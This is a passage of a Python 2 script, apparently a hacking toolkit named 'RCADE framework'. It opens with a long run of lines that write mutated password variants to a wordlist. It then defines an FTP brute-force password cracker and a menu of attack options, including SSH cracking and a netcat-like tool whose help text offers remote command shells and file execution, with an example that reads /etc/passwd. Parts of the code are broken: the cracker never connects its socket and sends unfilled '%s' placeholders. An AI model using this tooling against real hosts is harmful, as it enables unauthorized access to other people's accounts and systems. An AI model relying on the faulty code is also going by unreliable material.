            fobj.write(pass_2_1_lower_reverse + "\n")
            fobj.write(pass_2_1_title_reverse + "\n")
            fobj.write(pass_2_1_capitalize_reverse + "\n")
            fobj.write(pass_2_1_swapcase_reverse + "\n")
            fobj.write(pass_2_1_colon_reverse + "\n")
            fobj.write(pass_2_1_dot_reverse + "\n")
            fobj.write(pass_2_1_space_reverse + "\n")
            fobj.write(pass_2_1_underscore_reverse + "\n")
            fobj.write(pass_2_3 + "\n")
            fobj.write(pass_2_3_upper + "\n")
            fobj.write(pass_2_3_lower + "\n")
            fobj.write(pass_2_3_title + "\n")
            fobj.write(pass_2_3_capitalize + "\n")
            fobj.write(pass_2_3_swapcase + "\n")
            fobj.write(pass_2_3_colon + "\n")
            fobj.write(pass_2_3_dot + "\n")
            fobj.write(pass_2_3_space + "\n")
            fobj.write(pass_2_3_underscore + "\n")
            fobj.write(pass_2_3_reverse + "\n")
            fobj.write(pass_2_3_upper_reverse + "\n")
            fobj.write(pass_2_3_lower_reverse + "\n")
            fobj.write(pass_2_3_title_reverse + "\n")
            fobj.write(pass_2_3_capitalize_reverse + "\n")
            fobj.write(pass_2_3_swapcase_reverse + "\n")
            fobj.write(pass_2_3_colon_reverse + "\n")
            fobj.write(pass_2_3_dot_reverse + "\n")
            fobj.write(pass_2_3_space_reverse + "\n")
            fobj.write(pass_2_3_underscore_reverse + "\n")
            fobj.write(pass_3_1 + "\n")
            fobj.write(pass_3_1_upper + "\n")
            fobj.write(pass_3_1_lower + "\n")
            fobj.write(pass_3_1_title + "\n")
            fobj.write(pass_3_1_capitalize + "\n")
            fobj.write(pass_3_1_swapcase + "\n")
            fobj.write(pass_3_1_colon + "\n")
            fobj.write(pass_3_1_dot + "\n")
            fobj.write(pass_3_1_space + "\n")
            fobj.write(pass_3_1_underscore + "\n")
            fobj.write(pass_3_1_reverse + "\n")
            fobj.write(pass_3_1_upper_reverse + "\n")
            fobj.write(pass_3_1_lower_reverse + "\n")
            fobj.write(pass_3_1_title_reverse + "\n")
            fobj.write(pass_3_1_capitalize_reverse + "\n")
            fobj.write(pass_3_1_swapcase_reverse + "\n")
            fobj.write(pass_3_1_colon_reverse + "\n")
            fobj.write(pass_3_1_dot_reverse + "\n")
            fobj.write(pass_3_1_space_reverse + "\n")
            fobj.write(pass_3_1_underscore_reverse + "\n")
            fobj.write(pass_3_2 + "\n")
            fobj.write(pass_3_2_upper + "\n")
            fobj.write(pass_3_2_lower + "\n")
            fobj.write(pass_3_2_title + "\n")
            fobj.write(pass_3_2_capitalize + "\n")
            fobj.write(pass_3_2_swapcase + "\n")
            fobj.write(pass_3_2_colon + "\n")
            fobj.write(pass_3_2_dot + "\n")
            fobj.write(pass_3_2_space + "\n")
            fobj.write(pass_3_2_underscore + "\n")
            fobj.write(pass_3_2_reverse + "\n")
            fobj.write(pass_3_2_upper_reverse + "\n")
            fobj.write(pass_3_2_lower_reverse + "\n")
            fobj.write(pass_3_2_title_reverse + "\n")
            fobj.write(pass_3_2_capitalize_reverse + "\n")
            fobj.write(pass_3_2_swapcase_reverse + "\n")
            fobj.write(pass_3_2_colon_reverse + "\n")
            fobj.write(pass_3_2_dot_reverse + "\n")
            fobj.write(pass_3_2_space_reverse + "\n")
            fobj.write(pass_3_2_underscore_reverse + "\n")
            fobj.write(pass_1_2_3 + "\n")
            fobj.write(pass_1_2_3_upper + "\n")
            fobj.write(pass_1_2_3_lower + "\n")
            fobj.write(pass_1_2_3_title + "\n")
            fobj.write(pass_1_2_3_capitalize + "\n")
            fobj.write(pass_1_2_3_swapcase + "\n")
            fobj.write(pass_1_2_3_colon + "\n")
            fobj.write(pass_1_2_3_dot + "\n")
            fobj.write(pass_1_2_3_space + "\n")
            fobj.write(pass_1_2_3_underscore + "\n")
            fobj.write(pass_1_2_3_reverse + "\n")
            fobj.write(pass_1_2_3_upper_reverse + "\n")
            fobj.write(pass_1_2_3_lower_reverse + "\n")
            fobj.write(pass_1_2_3_title_reverse + "\n")
            fobj.write(pass_1_2_3_capitalize_reverse + "\n")
            fobj.write(pass_1_2_3_swapcase_reverse + "\n")
            fobj.write(pass_1_2_3_colon_reverse + "\n")
            fobj.write(pass_1_2_3_dot_reverse + "\n")
            fobj.write(pass_1_2_3_space_reverse + "\n")
            fobj.write(pass_1_2_3_underscore_reverse + "\n")
            fobj.write(pass_1_3_2 + "\n")
            fobj.write(pass_1_3_2_upper + "\n")
            fobj.write(pass_1_3_2_lower + "\n")
            fobj.write(pass_1_3_2_title + "\n")
            fobj.write(pass_1_3_2_capitalize + "\n")
            fobj.write(pass_1_3_2_swapcase + "\n")
            fobj.write(pass_1_3_2_colon + "\n")
            fobj.write(pass_1_3_2_dot + "\n")
            fobj.write(pass_1_3_2_space + "\n")
            fobj.write(pass_1_3_2_underscore + "\n")
            fobj.write(pass_1_3_2_reverse + "\n")
            fobj.write(pass_1_3_2_upper_reverse + "\n")
            fobj.write(pass_1_3_2_lower_reverse + "\n")
            fobj.write(pass_1_3_2_title_reverse + "\n")
            fobj.write(pass_1_3_2_capitalize_reverse + "\n")
            fobj.write(pass_1_3_2_swapcase_reverse + "\n")
            fobj.write(pass_1_3_2_colon_reverse + "\n")
            fobj.write(pass_1_3_2_dot_reverse + "\n")
            fobj.write(pass_1_3_2_space_reverse + "\n")
            fobj.write(pass_1_3_2_underscore_reverse + "\n")
            fobj.write(pass_2_1_3 + "\n")
            fobj.write(pass_2_1_3_upper + "\n")
            fobj.write(pass_2_1_3_lower + "\n")
            fobj.write(pass_2_1_3_title + "\n")
            fobj.write(pass_2_1_3_capitalize + "\n")
            fobj.write(pass_2_1_3_swapcase + "\n")
            fobj.write(pass_2_1_3_colon + "\n")
            fobj.write(pass_2_1_3_dot + "\n")
            fobj.write(pass_2_1_3_space + "\n")
            fobj.write(pass_2_1_3_underscore + "\n")
            fobj.write(pass_2_1_3_reverse + "\n")
            fobj.write(pass_2_1_3_upper_reverse + "\n")
            fobj.write(pass_2_1_3_lower_reverse + "\n")
            fobj.write(pass_2_1_3_title_reverse + "\n")
            fobj.write(pass_2_1_3_capitalize_reverse + "\n")
            fobj.write(pass_2_1_3_swapcase_reverse + "\n")
            fobj.write(pass_2_1_3_colon_reverse + "\n")
            fobj.write(pass_2_1_3_dot_reverse + "\n")
            fobj.write(pass_2_1_3_space_reverse + "\n")
            fobj.write(pass_2_1_3_underscore_reverse + "\n")
            fobj.write(pass_2_3_1 + "\n")
            fobj.write(pass_2_3_1_upper + "\n")
            fobj.write(pass_2_3_1_lower + "\n")
            fobj.write(pass_2_3_1_title + "\n")
            fobj.write(pass_2_3_1_capitalize + "\n")
            fobj.write(pass_2_3_1_swapcase + "\n")
            fobj.write(pass_2_3_1_colon + "\n")
            fobj.write(pass_2_3_1_dot + "\n")
            fobj.write(pass_2_3_1_space + "\n")
            fobj.write(pass_2_3_1_underscore + "\n")
            fobj.write(pass_2_3_1_reverse + "\n")
            fobj.write(pass_2_3_1_upper_reverse + "\n")
            fobj.write(pass_2_3_1_lower_reverse + "\n")
            fobj.write(pass_2_3_1_title_reverse + "\n")
            fobj.write(pass_2_3_1_capitalize_reverse + "\n")
            fobj.write(pass_2_3_1_swapcase_reverse + "\n")
            fobj.write(pass_2_3_1_colon_reverse + "\n")
            fobj.write(pass_2_3_1_dot_reverse + "\n")
            fobj.write(pass_2_3_1_space_reverse + "\n")
            fobj.write(pass_2_3_1_underscore_reverse + "\n")
            fobj.write(pass_3_1_2 + "\n")
            fobj.write(pass_3_1_2_upper + "\n")
            fobj.write(pass_3_1_2_lower + "\n")
            fobj.write(pass_3_1_2_title + "\n")
            fobj.write(pass_3_1_2_capitalize + "\n")
            fobj.write(pass_3_1_2_swapcase + "\n")
            fobj.write(pass_3_1_2_colon + "\n")
            fobj.write(pass_3_1_2_dot + "\n")
            fobj.write(pass_3_1_2_space + "\n")
            fobj.write(pass_3_1_2_underscore + "\n")
            fobj.write(pass_3_1_2_reverse + "\n")
            fobj.write(pass_3_1_2_upper_reverse + "\n")
            fobj.write(pass_3_1_2_lower_reverse + "\n")
            fobj.write(pass_3_1_2_title_reverse + "\n")
            fobj.write(pass_3_1_2_capitalize_reverse + "\n")
            fobj.write(pass_3_1_2_swapcase_reverse + "\n")
            fobj.write(pass_3_1_2_colon_reverse + "\n")
            fobj.write(pass_3_1_2_dot_reverse + "\n")
            fobj.write(pass_3_1_2_space_reverse + "\n")
            fobj.write(pass_3_1_2_underscore_reverse + "\n")
            fobj.write(pass_3_2_1 + "\n")
            fobj.write(pass_3_2_1_upper + "\n")
            fobj.write(pass_3_2_1_lower + "\n")
            fobj.write(pass_3_2_1_title + "\n")
            fobj.write(pass_3_2_1_capitalize + "\n")
            fobj.write(pass_3_2_1_swapcase + "\n")
            fobj.write(pass_3_2_1_colon + "\n")
            fobj.write(pass_3_2_1_dot + "\n")
            fobj.write(pass_3_2_1_space + "\n")
            fobj.write(pass_3_2_1_underscore + "\n")
            fobj.write(pass_3_2_1_reverse + "\n")
            fobj.write(pass_3_2_1_upper_reverse + "\n")
            fobj.write(pass_3_2_1_lower_reverse + "\n")
            fobj.write(pass_3_2_1_title_reverse + "\n")
            fobj.write(pass_3_2_1_capitalize_reverse + "\n")
            fobj.write(pass_3_2_1_swapcase_reverse + "\n")
            fobj.write(pass_3_2_1_colon_reverse + "\n")
            fobj.write(pass_3_2_1_dot_reverse + "\n")
            fobj.write(pass_3_2_1_space_reverse + "\n")
            fobj.write(pass_3_2_1_underscore_reverse + "\n")

def ftp_cracker():

    def connect(username, password):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print "[*] Trying %s:%s" % (username, password)

        data = s.recv(1024)

        s.send('USER %s\r\n')

        data = s.recv(1024)

        s.send('PASS %s\r\n')

        data = s.recv(3)

        s.send('QUIT\r\n')

        s.close()

        return data

    ip = raw_input("Please enter an IP-adress to attack: ")
    port = int(input("Please enter a port to attack: "))
    word_list = raw_input("Please enter the total path to your password list: ")
    username = raw_input("Please enter a username to attack: ")

    passwords = open(word_list, "r")

    for password in passwords:

        attempt = connect(username, password)

        if attempt == "230":

            print "[*] Password found: %s" % (password)

            sys.exit(0)

print('#################################')
print('')
print('______  _____   ___ ______ _____ ')
print('| ___ \/  __ \ / _ \|  _  \  ___|')
print('| |_/ /| /  \// /_\ \ | | | |__  ')
print('| |_/ /| /  \// /_\ \ | | | |__  ')
print('| |\ \ | \__/\| | | | |/ /| |___ ')
print('\_| \_| \____/\_| |_/___/ \____/ ')
print('')
print('RCADE framework')
print('')
print('Version 1.0')
print('')
print('#################################')
print('')
print('Options: ')
print('1: Port scanner')
print('2: Ping sweep')
print('3: Network multitool')
print('4: Password-list generator')
print('5: FTP password cracker')
print('6: SSH password cracker')
print('7: Banner grabber')

attack = int(input('Please choose an option: '))

if attack == 1:
    ip = raw_input('Please enter an IP-adress: ')
    ports = int(input('Please enter the port you would like to scan up to: '))
    ports += 1
    port_scanner(ip, ports)

if attack == 2:
    ping_sweep()

if attack == 3:
    print "Network multitool"
    print ""
    print "Parameters: "
    print "-l           - listen on [host]:[port] for incoming connections"
    print "-e           - execute the given file upon receiving a connection"
    print "-c           - initialize a command shell"
    print "-u           - upon receiving a connection, upload a file and write to [destination]"
    print "-t           - specify the IP-adress of the target"
    print "-p           - specify the port of the target"
    print ""
    print "Examples: "
    print "-t 192.168.0.1 -p 5555 -l -c"
    print "-t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "-t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print ""
    parameters = raw_input('Please enter a parameter. Enter "Done" to continue:')
    multitool(parameters)

if attack == 4:
    pass_generator()

if attack == 5:
    ftp_cracker()
